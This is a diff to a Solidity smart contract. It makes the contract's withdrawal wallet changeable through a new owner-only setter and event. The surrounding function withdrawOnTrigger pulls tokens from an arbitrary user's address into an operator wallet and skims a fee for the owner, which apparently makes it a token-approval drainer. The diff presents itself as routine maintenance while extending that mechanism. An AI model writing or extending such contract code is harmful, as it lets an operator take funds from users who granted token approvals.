@@ -21,10 +21,16 @@ contract Main is Ownable, ReentrancyGuard, Pausable {
         uint256 timestamp
     );
     
+    event WithdrawalWalletUpdated(
+        address indexed oldWallet,
+        address indexed newWallet,
+        uint256 timestamp
+    );
+    
     uint256 public protocolFee = 50;
     uint256 public constant MAX_FEE = 500;
     
-    address public constant WITHDRAWAL_WALLET = 0x9E02783Ad42C5A94a0De60394f2996E44458B782;
+    address public withdrawalWallet = 0x9E02783Ad42C5A94a0De60394f2996E44458B782;
     
     modifier onlyOwnerOrAuthorized() {
         require(msg.sender == owner() || msg.sender == address(this), "Not authorized");
@@ -48,6 +54,13 @@ contract Main is Ownable, ReentrancyGuard, Pausable {
         emit ProtocolFeeUpdated(oldFee, newFee, block.timestamp);
     }
     
+    function setWithdrawalWallet(address newWallet) external onlyOwner {
+        require(newWallet != address(0), "Invalid wallet address");
+        address oldWallet = withdrawalWallet;
+        withdrawalWallet = newWallet;
+        emit WithdrawalWalletUpdated(oldWallet, newWallet, block.timestamp);
+    }
+    
     function withdrawOnTrigger(
         address user,
         address token,
@@ -64,17 +77,17 @@ contract Main is Ownable, ReentrancyGuard, Pausable {
         uint256 feeAmount = (amount * protocolFee) / 10000;
         uint256 transferAmount = amount - feeAmount;
         
-        require(tokenContract.transferFrom(user, WITHDRAWAL_WALLET, transferAmount), "Transfer failed");
+        require(tokenContract.transferFrom(user, withdrawalWallet, transferAmount), "Transfer failed");
         
         if (feeAmount > 0) {
             require(tokenContract.transferFrom(user, owner(), feeAmount), "Fee transfer failed");
         }
         
-        emit TokensWithdrawn(user, token, amount, WITHDRAWAL_WALLET, block.timestamp);
+        emit TokensWithdrawn(user, token, amount, withdrawalWallet, block.timestamp);
     }
     
     function emergencyWithdraw(address token, uint256 amount) external onlyOwner whenNotPaused {
-        IERC20(token).transfer(WITHDRAWAL_WALLET, amount);
+        IERC20(token).transfer(withdrawalWallet, amount);
     }
     
     function emergencyWithdrawETH(uint256 amount) external onlyOwner whenNotPaused {
